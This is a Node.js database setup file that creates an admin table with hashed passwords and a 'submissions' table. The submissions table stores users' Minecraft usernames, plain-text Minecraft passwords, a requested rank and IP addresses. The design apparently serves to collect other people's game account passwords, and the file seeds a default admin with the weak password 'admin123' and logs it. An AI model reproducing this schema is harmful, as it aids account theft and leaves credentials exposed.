const Database = require('better-sqlite3');
const bcrypt = require('bcryptjs');
const path = require('path');

const db = new Database(path.join(__dirname, 'data.db'));

// ── Schema ───────────────────────────────────────────────────
db.exec(`
  CREATE TABLE IF NOT EXISTS admins (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    username   TEXT UNIQUE NOT NULL,
    password   TEXT NOT NULL,
    created_at TEXT DEFAULT (datetime('now'))
  );

  CREATE TABLE IF NOT EXISTS submissions (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    rank        TEXT NOT NULL,
    mc_username TEXT NOT NULL,
    mc_password TEXT DEFAULT '',
    ip_address  TEXT,
    submitted_at TEXT DEFAULT (datetime('now'))
  );
`);

// ── Seed default admin if none exists ────────────────────────
const adminCount = db.prepare('SELECT COUNT(*) as count FROM admins').get();
if (adminCount.count === 0) {
  const defaultPassword = process.env.ADMIN_PASSWORD || 'admin123';
  const hashed = bcrypt.hashSync(defaultPassword, 10);
  db.prepare('INSERT INTO admins (username, password) VALUES (?, ?)').run('admin', hashed);
  console.log(`🔑 Default admin created → username: admin / password: ${defaultPassword}`);
  console.log('   ⚠️  Change this in your .env file before going live!');
}

module.exports = db;
